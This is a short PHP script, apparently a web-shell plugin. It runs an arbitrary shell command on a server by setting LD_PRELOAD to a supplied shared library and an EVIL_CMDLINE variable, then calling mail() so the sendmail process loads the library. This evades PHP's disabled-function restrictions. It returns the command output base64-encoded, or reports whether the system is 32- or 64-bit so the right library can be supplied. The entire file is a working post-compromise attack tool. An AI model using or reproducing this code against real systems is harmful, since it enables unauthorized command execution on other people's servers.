<?php
//global: $pwd, $cmd, $sopath
set_time_limit(0);
$ret = array('code'=>1, 'msg'=>'');
chdir($pwd);
if(file_exists($sopath)){
    $tmpfile = tempnam(sys_get_temp_dir(), "sdf");
    $cmd = "exec > $tmpfile 2>&1;$cmd";
    putenv("EVIL_CMDLINE=".$cmd);
    putenv("LD_PRELOAD=".$sopath);
    mail("", "", "", "");
    $f = fopen($tmpfile, 'rb');
    if($f!==false && ($data = fread($f, filesize($tmpfile)))!==false){
        $ret['msg'] = base64_encode($data);
    }else{
        $ret['code'] = -1;
    }
    unlink($tmpfile);
}else{
    $ret['code'] = -2;
    # 判断操作系统是多少位的
    $int = "9223372036854775807";
    $int = intval($int);
    if ($int == 9223372036854775807) {
            /* 64bit */
        $ret['msg'] = '64';
    }
    elseif ($int == 2147483647) {
        /* 32bit */
        $ret['msg'] = '32';
    }
    else {
        /* error */
        $ret['msg'] = '32';
    }
}
echo json_encode($ret);